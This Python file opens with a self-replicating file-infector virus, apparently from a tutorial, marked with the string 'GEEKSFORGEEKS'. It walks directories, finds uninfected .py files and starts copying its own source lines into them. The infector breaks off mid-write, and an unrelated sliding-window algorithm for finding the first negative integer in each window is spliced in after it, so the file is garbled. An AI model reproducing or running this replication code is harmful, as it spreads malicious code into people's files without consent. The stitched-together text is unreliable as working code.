#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 code for First negative integer
# in every window of size k
def printFirstNegativeInteger(arr, k):
    firstNegativeIndex = 0
 
    for i in range(k - 1, len(arr)):
 
        # skip out of window and positive elements
        while firstNegativeIndex < i and (firstNegativeIndex <= i - k or arr[firstNegativeIndex] >= 0):
            firstNegativeIndex += 1
 
        # check if a negative element is found, otherwise use 0
        firstNegativeElement = arr[firstNegativeIndex] if arr[firstNegativeIndex] < 0 else 0
        print(firstNegativeElement, end=' ')
 
 
if __name__ == "__main__":
    arr = [12, -1, -7, 8, -15, 30, 16, 28]
    k = 3
    printFirstNegativeInteger(arr, k)
 
# contributed by Arjun Lather
'''
Time Complexity: O(n)
Space Complexity: O(1)
'''